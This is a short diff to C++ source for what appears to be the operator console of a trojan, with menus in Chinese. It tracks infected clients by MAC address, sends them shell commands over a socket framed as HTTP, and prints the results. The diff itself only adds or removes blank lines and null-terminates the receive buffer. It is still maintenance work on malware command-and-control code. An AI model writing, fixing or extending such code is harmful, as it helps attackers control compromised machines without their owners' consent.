@@ -228,6 +228,7 @@ DWORD WINAPI InputThread(LPVOID lpParameter)
 		{
 			g_trojan_info[free_index].live_flag = 1;
 			//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
+			cout << endl;
 			cout << "                                            *---------------------------*" << endl;
 			cout << "                                            |  请输入要发送的指令种类： |" << endl;
 			cout << "                                            |        1.普通指令         |" << endl;
@@ -345,7 +346,6 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			sprintf(lenchar, "%d", 0);
 			iResult = send(ClientSocket, combine(protocolHead, lenchar), MAC_ADDR_LEN + POST_LEN, 0);
 			if (Ret>0) cout << "你可以随时输入任意客户端的Mac地址发送指令！" << endl;
-			
 			break;
 		case CMD_CMD:
 			cout << "执行命令" << CmdBuff << endl;
@@ -360,6 +360,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead)+ strlen(CmdBuff), 0);
 			// recv cmd result from trojan
 			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+			recvbuf[iResult] = '\0';
 			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);//包含头，要去的话调用killhead就行
 			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
 			if (Ret>0) cout << "返回Http响应," << strlen(protocolHead) << "字节" << endl;
